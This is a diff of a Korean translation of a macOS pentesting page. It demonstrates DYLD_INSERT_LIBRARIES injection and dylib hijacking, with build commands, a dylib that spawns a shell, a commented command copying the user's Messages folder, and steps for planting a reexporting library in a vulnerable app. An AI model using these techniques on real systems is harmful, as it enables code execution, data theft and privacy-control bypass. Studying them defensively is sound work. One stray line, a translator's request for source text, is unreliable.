@@ -4,7 +4,7 @@
 
 ## DYLD_INSERT_LIBRARIES 기본 예시
 
-**주입할 Library**로 shell을 실행:
+**shell을 실행하기 위해 inject할 Library:**
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -22,7 +22,7 @@ execv("/bin/bash", 0);
 //system("cp -r ~/Library/Messages/ /tmp/Messages/");
 }
 ```
-공격할 바이너리:
+공격 대상 Binary:
 ```c
 // gcc hello.c -o hello
 #include <stdio.h>
@@ -37,7 +37,7 @@ Injection:
 ```bash
 DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
-## Dyld Hijacking Example
+## Dyld Hijacking 예시
 
 대상으로 지정된 취약한 binary는 `/Applications/VulnDyld.app/Contents/Resources/lib/binary`입니다.
 
@@ -77,12 +77,12 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-이전 정보를 통해 **로드된 library의 signature를 확인하지 않으며** 다음 위치에서 library를 로드하려고 한다는 것을 알 수 있습니다:
+앞선 정보를 통해 **로드된 libraries의 signature를 확인하지 않으며**, 다음 위치에서 library를 **로드하려고 한다는 것을** 알 수 있습니다:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
 
-하지만 첫 번째 library는 존재하지 않습니다:
+하지만 첫 번째 경로는 존재하지 않습니다:
 ```bash
 pwd
 /Applications/VulnDyld.app
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-따라서 이를 hijack할 수 있습니다! 합법적인 library와 동일한 기능을 **일부 임의의 코드를 실행하고, 해당 library를 reexport하여 동일한 기능을 제공하는** library를 생성하세요. 그리고 예상되는 버전으로 compile하는 것을 잊지 마세요:
+따라서 이를 hijack할 수 있습니다! **임의의 code를 실행하고 legit library와 동일한 기능을 export**하는 library를 만들되, 해당 library를 reexporting하면 됩니다. 그리고 예상되는 versions로 compile해야 한다는 점을 기억하세요:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,7 +99,7 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-번역할 원문을 입력해 주세요.
+번역할 원문을 제공해 주세요.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
@@ -121,11 +121,11 @@ cmd LC_REEXPORT_DYLIB
 cmdsize 128
 name /Applications/Burp Suite Professional.app/Contents/Resources/jre.bundle/Contents/Home/lib/libjli.dylib (offset 24)
 ```
-마지막으로 **하이재킹된 위치**에 복사하기만 하면 됩니다:
+마지막으로 이를 **하이재킹된 위치**에 복사합니다:
 ```bash
 cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 ```
-그리고 **execute** binary를 실행하고 **library가 load되었는지 확인**합니다:
+그리고 **binary를 실행**하고 **library가 로드되었는지 확인**합니다:
 
 <pre class="language-context"><code class="lang-context">"/Applications/VulnDyld.app/Contents/Resources/lib/binary"
 <strong>2023-05-15 15:20:36.677 binary[78809:21797902] [+] dylib hijacked in /Applications/VulnDyld.app/Contents/Resources/lib/binary
@@ -133,16 +133,16 @@ cp lib.dylib "/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib"
 </code></pre>
 
 > [!TIP]
-> Telegram의 camera permissions를 abuse하여 이 vulnerability를 abuse하는 방법에 관한 좋은 writeup은 [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)에서 확인할 수 있습니다 <sup>[1]</sup>
+> Telegram의 camera permissions를 abuse하여 이 vulnerability를 exploit하는 방법에 대한 유용한 writeup은 [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>에서 확인할 수 있습니다.
 
 ## 더 큰 규모
 
-예상치 못한 binary에 library를 inject하려는 경우, event messages를 확인하여 library가 process 내부에 load되는 시점을 알아낼 수 있습니다(이 경우 `printf`와 `/bin/bash` 실행을 제거합니다).
+예상하지 못한 binary에 libraries를 inject하려는 경우, event messages를 확인하여 process 내부에 library가 로드되는 시점을 확인할 수 있습니다(이 경우 `printf`와 `/bin/bash` 실행을 제거합니다).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
-## 참고 자료
+## 참고 문헌
 
-- [1] [CVE-2023-26818 - macOS에서 Telegram으로 TCC 우회](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+- [1] [macOS에서 Telegram을 사용하여 TCC 우회](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 
 {{#include ../../../../banners/hacktricks-training.md}}
